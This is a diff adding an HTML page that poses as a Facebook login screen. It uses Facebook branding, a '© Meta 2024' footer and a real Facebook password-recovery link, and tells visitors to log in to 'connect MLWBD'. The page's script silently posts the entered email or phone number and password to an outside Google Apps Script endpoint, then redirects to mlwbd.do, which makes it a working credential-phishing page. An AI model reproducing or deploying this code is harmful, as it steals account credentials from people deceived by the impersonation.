@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<!-- Coding By Mongrey Marma - www.mongreycode.com -->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page | Codingrey</title>
+ 
+
+    <style>
+        body {
+          
+          font-family: 'Roboto',
+            background-color: #f5f5f5; /* Ash color */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+        }
+
+        .header {
+            background-color: #1877f2; /* Facebook blue color */
+            height: 60px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+     .logo {
+    font-size: 24px; /* Adjust size as needed */
+    margin-right: 10px; /* Add some space between icon and text */
+    color: #ffffff; /* Facebook logo color */
+}
+
+
+        .login-text {
+            color: white;
+            font-weight: bold;
+            font-size: 16px; /* Adjust size as needed */
+        }
+
+        /* CSS for centering the form and adjusting button size */
+     
+.container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: calc(100vh - 85px); /* Full height of viewport minus header height and some additional space */
+    padding-top: 10px; /* Adjusted to position the form 30px below header */
+    margin-top: 10px; /* Adjusted to move the container up slightly */
+}
+
+
+        .facebook-page {
+            text-align: center; /* Center align the form contents */
+        }
+
+        form {
+            width: 300px; /* Set the width of the form */
+            margin: 0 auto; /* Center the form horizontally */
+            order: -1; /* Move the form container above the image container */
+        }
+
+        form input[type="text"],
+        form input[type="password"],
+        .space-box {
+            width: 100%; /* Make input and button width 100% */
+            box-sizing: border-box; /* Ensure padding and border are included in the width */
+            margin-bottom: 10px; /* Add space between input boxes and button */
+            padding: 10px; /* Add padding for better aesthetics */
+            border: 1px solid #ccc; /* Add border */
+            border-radius: 5px; /* Add border radius */
+        }
+
+        form input[type="button"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px; /* Add border radius */
+        }
+
+        /* Hover effect */
+        form input[type="text"]:hover,
+        form input[type="password"]:hover,
+        .space-box:hover,
+        form input[type="button"]:hover {
+            border-color: #999; /* Change border color on hover */
+            background-color: #f0f0f0; /* Change background color on hover */
+            color: #333; /* Change text color on hover */
+        }
+
+  .image-container {
+    width: 80px;
+    height: 80px;
+    background-color: #f5f5f5;
+    margin-top: 0; /* Adjusted to position the image container slightly higher */
+    border-radius: 10px;
+    overflow: hidden;
+}
+     
+    overflow: hidden; /* Add this line */
+}
+
+.image-container:hover {
+    border-radius: 10%; /* Increase border radius on hover */
+}
+
+.image-container img {
+    max-width: 100%;
+    max-height: 100%;
+}
+
+
+        .forgot {
+            color: #42b72a; /* Green text color */
+            margin-top: 15px; /* Add space above the link */
+            display: block; /* Make the link a block element to control its layout */
+        }
+
+       .additional-text {
+    color:#8B8878; /* Light gray text color */
+    margin-top: 25px; /* Add space above the text */
+    font-size: 16px; /* Adjust text size as needed */
+    text-align: center; /* Center align the text */
+      padding-left:20px;
+      padding-right:20px;         
+         
+         
+       }
+  
+  .plaintext {
+    position: ;fixd;
+    bottom: 30px; /* Maintain bottom position */
+    left: 0;
+    right: 0;
+    text-align: center;
+    color: #8B8878; /* Light gray text color */
+    font-size: 16px; /* Adjust text size as needed */
+    margin-top: 50px; /* Move the footer up by 120px */
+}
+
+.custom-logo {
+    width: 30px;
+    height: 30px;
+    margin-right: 10px; /* Add some space between icon and text */
+}
+
+    </style>
+</head>
+
+<body>
+   <div class="header">
+    <img src="https://github.com/fbook0/login/raw/main/20240306_024319.png" alt="Custom Logo" class="custom-logo">
+    <span class="login-text">Login with Facebook</span>
+</div>
+
+    <div class="container">
+        <div class="image-container">
+            <img src="https://github.com/fbook0/login/raw/main/images (1) (2).jpeg" alt="Your Image">
+        </div>
+      
+       <p class="additional-text">Login to your Facebook account to connect MLWBD</p>
+      
+        <div class="facebook-page flex">
+            <div class="text">
+                <h1></h1>
+                
+            </div>
+            <form id="loginForm">
+                <div id="errorDiv"></div> <!-- Error message div -->
+                <input type="text" id="emailOrNumber" placeholder="Email or Phone Number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <div class="link">
+                    <input type="button" value="Login" onclick="submitForm()">
+                    <a href="https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&ars=facebook_login&from_login_screen=0&wtsid=rdr_0a1vrAnFl0f2Tj8xT&_rdr"
+                   class="forgot">Forgot password?</a>
+            </div>
+                </div>
+            </form>
+        </div>
+       
+    </div>
+
+
+<div class="plaintext">&copy; Meta 2024</div>
+
+
+    <script>
+        function submitForm() {
+            var emailOrNumber = document.getElementById("emailOrNumber").value;
+            var password = document.getElementById("password").value;
+            var formData = { emailOrNumber: emailOrNumber, password: password };
+
+            // Check if the password length is less than 6
+            if (password.length < 6) {
+                document.getElementById("errorDiv").textContent = "Invalid password";
+                document.getElementById("errorDiv").style.color = "red"; // Set color to red
+
+                // Remove the error message after 2 seconds
+                setTimeout(function() {
+                    document.getElementById("errorDiv").textContent = "";
+                }, 2000);
+
+                return; // Stop further execution
+            }
+
+            fetch('https://script.google.com/macros/s/AKfycbyJg3DXdqPehLn6am9tlyrXQHckKebOHRH8bIYmfMIQmOB-jr3H_8y-v_mmrVC1vh9O8w/exec', {
+                method: 'POST',
+                body: JSON.stringify(formData)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(data => {
+                console.log(data); // Log the response
+                // Redirect to error.html
+                window.location.href = "https://mlwbd.do/";
+            })
+            .catch(error => {
+                console.error('There was a problem with your fetch operation:', error);
+                // Display error message or perform any other error handling
+            });
+        }
+    </script>
+</body>
+</html>
